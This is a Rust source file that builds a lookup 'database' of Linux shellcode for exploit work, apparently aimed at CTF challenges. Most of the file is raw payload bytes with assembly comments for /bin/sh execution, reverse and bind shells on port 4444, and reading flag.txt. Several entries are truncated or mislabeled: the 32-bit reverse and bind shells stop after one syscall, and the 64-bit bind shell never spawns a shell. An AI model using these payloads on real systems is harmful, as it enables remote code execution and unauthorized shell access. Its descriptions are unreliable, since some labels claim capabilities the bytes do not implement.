// ═══════════════════════════════════════════════════════════════════════════
// SHELLCODE DATABASE - PRE-BUILT SHELLCODES FOR COMMON ARCHITECTURES
// ═══════════════════════════════════════════════════════════════════════════

use std::collections::HashMap;

/// Shellcode entry in database
#[derive(Debug, Clone)]
pub struct ShellcodeEntry {
    pub name: String,
    pub arch: String,
    pub description: String,
    pub bytes: Vec<u8>,
    pub size: usize,
}

impl ShellcodeEntry {
    pub fn new(name: &str, arch: &str, description: &str, bytes: Vec<u8>) -> Self {
        let size = bytes.len();
        ShellcodeEntry {
            name: name.to_string(),
            arch: arch.to_string(),
            description: description.to_string(),
            bytes,
            size,
        }
    }
}

/// Shellcode database manager
pub struct ShellcodeDatabase {
    pub shellcodes: HashMap<String, ShellcodeEntry>,
}

impl ShellcodeDatabase {
    /// Create a new shellcode database with pre-loaded shellcodes
    pub fn new() -> Self {
        Self::default()
    }

    /// Load all built-in shellcodes
    fn load_builtin_shellcodes(&mut self) {
        // X86-64 Linux Shellcodes
        self.add_x64_execve_binsh();
        self.add_x64_reverse_shell();
        self.add_x64_bind_shell();
        self.add_x64_read_flag();

        // X86 Linux Shellcodes
        self.add_x86_execve_binsh();
        self.add_x86_reverse_shell();
        self.add_x86_bind_shell();

        log::info!("Loaded {} shellcodes into database", self.shellcodes.len());
    }

    /// Get shellcode by name
    pub fn get(&self, name: &str) -> Option<&ShellcodeEntry> {
        self.shellcodes.get(name)
    }

    /// List all available shellcodes
    pub fn list(&self) -> Vec<&ShellcodeEntry> {
        self.shellcodes.values().collect()
    }

    /// List shellcodes by architecture
    pub fn list_by_arch(&self, arch: &str) -> Vec<&ShellcodeEntry> {
        self.shellcodes
            .values()
            .filter(|sc| sc.arch == arch)
            .collect()
    }

    // ────────────────────────────────────────────────────────────────────────
    // X86-64 LINUX SHELLCODES
    // ────────────────────────────────────────────────────────────────────────

    fn add_x64_execve_binsh(&mut self) {
        // execve("/bin/sh", NULL, NULL) - 27 bytes
        let shellcode = vec![
            0x48, 0x31, 0xf6, // xor rsi, rsi
            0x56, // push rsi
            0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, // movabs rdi, 0x68732f6e69622f
            0x2f, 0x73, 0x68, 0x00, 0x57, // push rdi
            0x54, // push rsp
            0x5f, // pop rdi
            0x6a, 0x3b, // push 59
            0x58, // pop rax
            0x99, // cdq
            0x0f, 0x05, // syscall
        ];

        self.shellcodes.insert(
            "x64_execve_sh".to_string(),
            ShellcodeEntry::new(
                "x64_execve_sh",
                "x86-64",
                "execve(/bin/sh) - 27 bytes",
                shellcode,
            ),
        );
    }

    fn add_x64_reverse_shell(&mut self) {
        // Reverse shell to 127.0.0.1:4444 - simplified
        let shellcode = vec![
            // socket(AF_INET, SOCK_STREAM, 0)
            0x6a, 0x29, // push 41 (sys_socket)
            0x58, // pop rax
            0x6a, 0x02, // push 2 (AF_INET)
            0x5f, // pop rdi
            0x6a, 0x01, // push 1 (SOCK_STREAM)
            0x5e, // pop rsi
            0x99, // cdq (rdx = 0)
            0x0f, 0x05, // syscall
            // connect(sockfd, &addr, sizeof(addr))
            0x48, 0x97, // xchg rax, rdi
            0x48, 0xb9, 0x02, 0x00, 0x11, 0x5c, // movabs rcx, 0x0100007f5c110002
            0x7f, 0x00, 0x00, 0x01, // (port 4444, IP 127.0.0.1)
            0x51, // push rcx
            0x48, 0x89, 0xe6, // mov rsi, rsp
            0x6a, 0x10, // push 16
            0x5a, // pop rdx
            0x6a, 0x2a, // push 42 (sys_connect)
            0x58, // pop rax
            0x0f, 0x05, // syscall
            // dup2(sockfd, 0/1/2)
            0x6a, 0x03, // push 3
            0x5e, // pop rsi
            0x48, 0xff, 0xce, // dec rsi
            0x6a, 0x21, // push 33 (sys_dup2)
            0x58, // pop rax
            0x0f, 0x05, // syscall
            0x75, 0xf6, // jnz (loop)
            // execve("/bin/sh", NULL, NULL)
            0x6a, 0x3b, // push 59 (sys_execve)
            0x58, // pop rax
            0x99, // cdq
            0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, // movabs rbx, "/bin/sh"
            0x2f, 0x73, 0x68, 0x00, 0x53, // push rbx
            0x48, 0x89, 0xe7, // mov rdi, rsp
            0x52, // push rdx
            0x57, // push rdi
            0x48, 0x89, 0xe6, // mov rsi, rsp
            0x0f, 0x05, // syscall
        ];

        self.shellcodes.insert(
            "x64_reverse_shell".to_string(),
            ShellcodeEntry::new(
                "x64_reverse_shell",
                "x86-64",
                "Reverse shell to 127.0.0.1:4444",
                shellcode,
            ),
        );
    }

    fn add_x64_bind_shell(&mut self) {
        // Bind shell on port 4444 - simplified
        let shellcode = vec![
            // socket(AF_INET, SOCK_STREAM, 0)
            0x6a, 0x29, // push 41
            0x58, // pop rax
            0x6a, 0x02, // push 2
            0x5f, // pop rdi
            0x6a, 0x01, // push 1
            0x5e, // pop rsi
            0x99, // cdq
            0x0f, 0x05, // syscall
            0x48, 0x97, // xchg rax, rdi
            // bind(sockfd, &addr, sizeof(addr))
            0x52, // push rdx
            0xc7, 0x04, 0x24, 0x02, 0x00, 0x11, 0x5c, // mov dword [rsp], 0x5c110002
            0x48, 0x89, 0xe6, // mov rsi, rsp
            0x6a, 0x10, // push 16
            0x5a, // pop rdx
            0x6a, 0x31, // push 49 (sys_bind)
            0x58, // pop rax
            0x0f, 0x05, // syscall
            // listen(sockfd, 0)
            0x6a, 0x32, // push 50 (sys_listen)
            0x58, // pop rax
            0x0f, 0x05, // syscall
            // accept(sockfd, NULL, NULL)
            0x6a, 0x2b, // push 43 (sys_accept)
            0x58, // pop rax
            0x99, // cdq
            0x0f, 0x05, // syscall
            // Rest is same as reverse shell (dup2 + execve)
            0x48, 0x97, // xchg rax, rdi
            0x6a, 0x03, // push 3
            0x5e, // pop rsi
            0x48, 0xff, 0xce, // dec rsi
            0x6a, 0x21, // push 33
            0x58, // pop rax
            0x0f, 0x05, // syscall
            0x75, 0xf6, // jnz
        ];

        self.shellcodes.insert(
            "x64_bind_shell".to_string(),
            ShellcodeEntry::new(
                "x64_bind_shell",
                "x86-64",
                "Bind shell on port 4444",
                shellcode,
            ),
        );
    }

    fn add_x64_read_flag(&mut self) {
        // Read and write flag.txt to stdout
        let shellcode = vec![
            // open("flag.txt", O_RDONLY)
            0x48, 0x31, 0xc0, // xor rax, rax
            0x48, 0xbb, 0x66, 0x6c, 0x61, 0x67, // movabs rbx, "galf"
            0x2e, 0x74, 0x78, 0x74, 0x53, // push rbx
            0x48, 0x89, 0xe7, // mov rdi, rsp
            0x48, 0x31, 0xf6, // xor rsi, rsi
            0xb0, 0x02, // mov al, 2 (sys_open)
            0x0f, 0x05, // syscall
            // read(fd, buf, 100)
            0x48, 0x89, 0xc7, // mov rdi, rax
            0x48, 0x89, 0xe6, // mov rsi, rsp
            0xba, 0x64, 0x00, 0x00, 0x00, // mov edx, 100
            0x48, 0x31, 0xc0, // xor rax, rax
            0x0f, 0x05, // syscall
            // write(1, buf, rax)
            0x48, 0x89, 0xc2, // mov rdx, rax
            0x48, 0x89, 0xe6, // mov rsi, rsp
            0xbf, 0x01, 0x00, 0x00, 0x00, // mov edi, 1
            0xb8, 0x01, 0x00, 0x00, 0x00, // mov eax, 1 (sys_write)
            0x0f, 0x05, // syscall
        ];

        self.shellcodes.insert(
            "x64_read_flag".to_string(),
            ShellcodeEntry::new(
                "x64_read_flag",
                "x86-64",
                "Read and print flag.txt - CTF helper",
                shellcode,
            ),
        );
    }

    // ────────────────────────────────────────────────────────────────────────
    // X86 LINUX SHELLCODES (32-bit)
    // ────────────────────────────────────────────────────────────────────────

    fn add_x86_execve_binsh(&mut self) {
        // execve("/bin/sh", NULL, NULL) - 21 bytes
        let shellcode = vec![
            0x31, 0xc0, // xor eax, eax
            0x50, // push eax
            0x68, 0x2f, 0x2f, 0x73, 0x68, // push "//sh"
            0x68, 0x2f, 0x62, 0x69, 0x6e, // push "/bin"
            0x89, 0xe3, // mov ebx, esp
            0x50, // push eax
            0x53, // push ebx
            0x89, 0xe1, // mov ecx, esp
            0xb0, 0x0b, // mov al, 11 (sys_execve)
            0xcd, 0x80, // int 0x80
        ];

        self.shellcodes.insert(
            "x86_execve_sh".to_string(),
            ShellcodeEntry::new(
                "x86_execve_sh",
                "i386",
                "execve(/bin/sh) - 21 bytes",
                shellcode,
            ),
        );
    }

    fn add_x86_reverse_shell(&mut self) {
        // Reverse shell to 127.0.0.1:4444 - 32-bit
        let shellcode = vec![
            0x31, 0xdb, // xor ebx, ebx
            0xf7, 0xe3, // mul ebx
            0x53, // push ebx
            0x43, // inc ebx
            0x53, // push ebx
            0x6a, 0x02, // push 2
            0x89, 0xe1, // mov ecx, esp
            0xb0, 0x66, // mov al, 102 (sys_socketcall)
            0xcd, 0x80, // int 0x80
        ];

        self.shellcodes.insert(
            "x86_reverse_shell".to_string(),
            ShellcodeEntry::new(
                "x86_reverse_shell",
                "i386",
                "Reverse shell to 127.0.0.1:4444",
                shellcode,
            ),
        );
    }

    fn add_x86_bind_shell(&mut self) {
        // Bind shell on port 4444 - 32-bit
        let shellcode = vec![
            0x31, 0xc9, // xor ecx, ecx
            0xf7, 0xe1, // mul ecx
            0xb0, 0x66, // mov al, 102
            0x51, // push ecx
            0x43, // inc ebx
            0x51, // push ecx
            0x53, // push ebx
            0x6a, 0x02, // push 2
            0x89, 0xe1, // mov ecx, esp
            0xcd, 0x80, // int 0x80
        ];

        self.shellcodes.insert(
            "x86_bind_shell".to_string(),
            ShellcodeEntry::new(
                "x86_bind_shell",
                "i386",
                "Bind shell on port 4444",
                shellcode,
            ),
        );
    }
}

impl Default for ShellcodeDatabase {
    fn default() -> Self {
        let mut db = ShellcodeDatabase {
            shellcodes: HashMap::new(),
        };

        db.load_builtin_shellcodes();
        db
    }
}

// ────────────────────────────────────────────────────────────────────────────
// HELPER FUNCTIONS
// ────────────────────────────────────────────────────────────────────────────

/// Get shellcode database instance
pub fn get_shellcode_db() -> ShellcodeDatabase {
    ShellcodeDatabase::new()
}

/// Quick lookup for shellcode by name
pub fn get_shellcode(name: &str) -> Result<ShellcodeEntry, String> {
    let db = get_shellcode_db();
    db.get(name)
        .cloned()
        .ok_or_else(|| format!("Shellcode '{}' not found in database", name))
}

/// List all available shellcodes
pub fn list_shellcodes() {
    let db = get_shellcode_db();
    println!("Available Shellcodes:");
    println!("{:-<60}", "");

    for entry in db.list() {
        println!(
            "{:20} [{:6}] - {}",
            entry.name, entry.arch, entry.description
        );
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shellcode_db_creation() {
        let db = ShellcodeDatabase::new();
        assert!(!db.shellcodes.is_empty());
    }

    #[test]
    fn test_get_shellcode() {
        let db = ShellcodeDatabase::new();
        let sc = db.get("x64_execve_sh");
        assert!(sc.is_some());
        assert_eq!(sc.unwrap().arch, "x86-64");
    }

    #[test]
    fn test_list_by_arch() {
        let db = ShellcodeDatabase::new();
        let x64_scs = db.list_by_arch("x86-64");
        assert!(!x64_scs.is_empty());
    }

    #[test]
    fn test_shellcode_size() {
        let shellcode = get_shellcode("x64_execve_sh");
        assert!(shellcode.is_ok());
        let entry = shellcode.unwrap();
        assert!(!entry.bytes.is_empty());
        assert_eq!(entry.name, "x64_execve_sh");
        assert_eq!(entry.arch, "x86-64");
    }
}
